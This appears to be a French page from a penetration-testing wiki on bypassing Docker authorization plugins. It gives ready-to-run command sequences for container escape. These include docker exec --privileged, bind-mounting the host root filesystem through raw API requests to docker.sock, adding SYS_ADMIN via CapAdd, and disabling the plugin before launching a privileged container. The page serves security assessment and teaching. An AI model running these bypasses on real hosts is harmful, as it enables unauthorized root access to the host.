# Plugins d’autorisation à l’exécution

{{#include ../../../banners/hacktricks-training.md}}

## Vue d’ensemble

Les plugins d’autorisation à l’exécution constituent une couche de stratégie supplémentaire qui décide si un appelant peut effectuer une action donnée du daemon. Docker en est l’exemple classique. Par défaut, toute personne pouvant communiquer avec le daemon Docker dispose d’un contrôle étendu sur celui-ci. Les plugins d’autorisation tentent de restreindre ce modèle en examinant l’identité de l’utilisateur authentifié et l’opération API demandée, puis en autorisant ou en refusant la requête selon la stratégie définie.

Ce sujet mérite sa propre page, car il modifie le modèle d’exploitation lorsqu’un attaquant a déjà accès à une API Docker ou à un utilisateur du groupe `docker`. Dans ce type d’environnement, la question n’est plus seulement « puis-je atteindre le daemon ? », mais aussi « le daemon est-il protégé par une couche d’autorisation et, si oui, cette couche peut-elle être contournée par des endpoints non gérés, une analyse JSON faible ou des permissions d’administration des plugins ? »

## Fonctionnement

Lorsqu’une requête atteint le daemon Docker, le sous-système d’autorisation peut transmettre le contexte de la requête à un ou plusieurs plugins installés. Le plugin voit l’identité de l’utilisateur authentifié, les détails de la requête, certains en-têtes et des parties du corps de la requête ou de la réponse lorsque le type de contenu le permet. Plusieurs plugins peuvent être chaînés, et l’accès n’est accordé que si tous les plugins autorisent la requête.

Ce modèle semble robuste, mais sa sécurité dépend entièrement de la compréhension exhaustive de l’API par l’auteur de la stratégie. Un plugin qui bloque `docker run --privileged`, mais ignore `docker exec`, ne détecte pas des clés JSON alternatives telles que `Binds` au niveau supérieur ou autorise l’administration des plugins, peut donner un faux sentiment de restriction tout en laissant ouvertes des voies directes d’escalade de privilèges.

## Cibles courantes des plugins

Les points importants à examiner dans une stratégie sont :

- les endpoints de création de conteneurs
- les champs `HostConfig`, tels que `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` et les options de partage d’espaces de noms
- le comportement de `docker exec`
- les endpoints de gestion des plugins
- tout endpoint pouvant déclencher indirectement des actions du runtime en dehors du modèle de stratégie prévu

Historiquement, des exemples comme le plugin `authz` de Twistlock et des plugins pédagogiques simples comme `authobot` ont facilité l’étude de ce modèle, car leurs fichiers de stratégie et leurs chemins de code montraient comment le mappage entre endpoints et actions était réellement implémenté. Pour les travaux d’évaluation, la leçon importante est que l’auteur de la stratégie doit comprendre toute la surface de l’API, et pas seulement les commandes CLI les plus visibles.

## Abus

La première étape consiste à découvrir ce qui est réellement bloqué. Si le daemon refuse une action, l’erreur leak souvent le nom du plugin, ce qui aide à identifier le contrôle utilisé :

```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```

Si vous avez besoin d’un profilage plus large des endpoints, des outils tels que `docker_auth_profiler` sont utiles, car ils automatisent la tâche autrement répétitive consistant à vérifier quelles routes d’API et quelles structures JSON sont réellement autorisées par le plugin.

Si l’environnement utilise un plugin personnalisé et que vous pouvez interagir avec l’API, énumérez les champs d’objet réellement filtrés :

```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```

Ces vérifications sont importantes, car de nombreux échecs d’autorisation concernent des champs spécifiques plutôt que des concepts. Un plugin peut rejeter un motif CLI sans bloquer complètement la structure API équivalente.

### Exemple complet : `docker exec` ajoute des privilèges après la création du conteneur

Une policy qui bloque la création de conteneurs privilégiés, mais autorise la création de conteneurs sans confinement ainsi que `docker exec`, peut tout de même être contournée :

```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```

Si le daemon accepte la deuxième étape, l’utilisateur a récupéré un processus interactif privilégié dans un container que l’auteur de la policy croyait restreint.

Une règle `sudo` restreinte peut exposer la même voie, même si l’appelant ne peut pas accéder directement au socket Docker. Par exemple, une autorisation root sur `/usr/bin/docker exec *` peut permettre à l’appelant de fournir les options Docker `--privileged` et `--user root`. Un container en cours d’exécution reste nécessaire ; sur certains hôtes Linux, son ID est visible dans la ligne de commande d’un processus `containerd-shim` lorsque `docker ps` est refusé. Considérez cette règle comme une piste à examiner : confirmez la policy `sudo` effective, les contrôles d’autorisation du daemon, les user namespaces, et vérifiez si le processus obtenu peut accéder à un périphérique de l’hôte ou à un montage hôte inscriptible. Docker décrit les options `exec` dans sa [référence CLI](https://docs.docker.com/reference/cli/docker/container/exec/).

Un wrapper exécuté par root qui accepte un fichier Compose choisi par l’appelant doit valider l’intégralité du [modèle de service Compose](https://docs.docker.com/reference/compose-file/services/), et pas seulement rejeter `privileged: true` et exiger `:ro` sur les bind mounts. Examinez `cap_add`, `security_opt`, les périphériques, les namespaces, les entrées de build et toutes les syntaxes de volume prises en charge. Un bind mount en lecture seule peut tout de même devenir inscriptible depuis l’intérieur d’un container doté de capacités adaptées et d’un confinement de sécurité assoupli, selon la policy du daemon et du kernel. Les listes d’autorisation des chemins hôtes basées uniquement sur des préfixes, ainsi que les vérifications de symlink portant uniquement sur le composant final du chemin, doivent également être examinées. Une règle `sudo` et un appel littéral à `docker-compose up` identifient une piste à examiner ; l’exploitabilité dépend de la validation effective du wrapper et des restrictions du daemon à l’exécution.

### Exemple complet : bind mount via l’API brute

Certaines policies défaillantes n’inspectent qu’une seule forme JSON. Si le bind mount du système de fichiers racine n’est pas bloqué de façon cohérente, l’hôte peut tout de même être monté :

```bash
docker version
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```

La même idée peut également apparaître sous `HostConfig` :

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
  http:/v1.41/containers/create
```

L’impact est un échappement complet du système de fichiers de l’hôte. Le détail intéressant est que le bypass provient d’une couverture incomplète de la policy plutôt que d’un bug du kernel.

### Exemple complet : attribut de capacité non vérifié

Si la policy oublie de filtrer un attribut lié aux capabilities, l’attaquant peut créer un container qui récupère une capability dangereuse :

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```

Une fois que `CAP_SYS_ADMIN` ou une capability tout aussi puissante est disponible, de nombreuses techniques d’évasion décrites dans [capabilities.md](protections/capabilities.md) et [privileged-containers.md](privileged-containers.md) deviennent accessibles.

### Exemple complet : désactiver le plugin

Si les opérations de gestion des plugins sont autorisées, le contournement le plus simple consiste peut-être à désactiver complètement le contrôle :

```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```

Il s’agit d’une défaillance de stratégie au niveau du plan de contrôle. La couche d’autorisation existe, mais l’utilisateur qu’elle était censée restreindre conserve l’autorisation de la désactiver.

## Vérifications

Ces commandes visent à déterminer si une couche de stratégie existe et si elle semble complète ou superficielle.

```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```

Ce qui est intéressant ici :

- Les messages de refus qui mentionnent le nom d’un plugin confirment la présence d’une couche d’autorisation et révèlent souvent l’implémentation exacte.
- Une liste de plugins visible par l’attaquant peut suffire à découvrir s’il est possible de désactiver ou de reconfigurer des éléments.
- Une policy qui bloque uniquement les actions CLI évidentes, mais pas les requêtes API brutes, doit être considérée comme contournable jusqu’à preuve du contraire.

## Valeurs par défaut des runtimes

| Runtime / plateforme | État par défaut | Comportement par défaut | Affaiblissements manuels courants |
| --- | --- | --- | --- |
| Docker Engine | Désactivé par défaut | L’accès au daemon est pratiquement tout ou rien, sauf si un plugin d’autorisation est configuré | policy de plugin incomplète, listes de blocage au lieu de listes d’autorisation, autorisation de gérer les plugins, angles morts au niveau des champs |
| Podman | Pas d’équivalent direct courant | Podman s’appuie généralement davantage sur les permissions Unix, l’exécution rootless et les décisions d’exposition de l’API que sur les plugins d’autorisation de type Docker | exposition large d’une API Podman rootful, permissions faibles sur le socket |
| containerd / CRI-O | Modèle de contrôle différent | Ces runtimes s’appuient généralement sur les permissions du socket, les limites de confiance des nœuds et les contrôles de l’orchestrateur de niveau supérieur plutôt que sur les plugins d’autorisation Docker | montage du socket dans des workloads, hypothèses de confiance locale au nœud trop faibles |
| Kubernetes | Utilise l’authentification et l’autorisation au niveau de l’API server et du kubelet, et non les plugins d’autorisation Docker | Le RBAC du cluster et les contrôles d’admission constituent la principale couche de policy | RBAC trop permissif, policy d’admission faible, exposition directe du kubelet ou des API du runtime |

{{#include ../../../banners/hacktricks-training.md}}
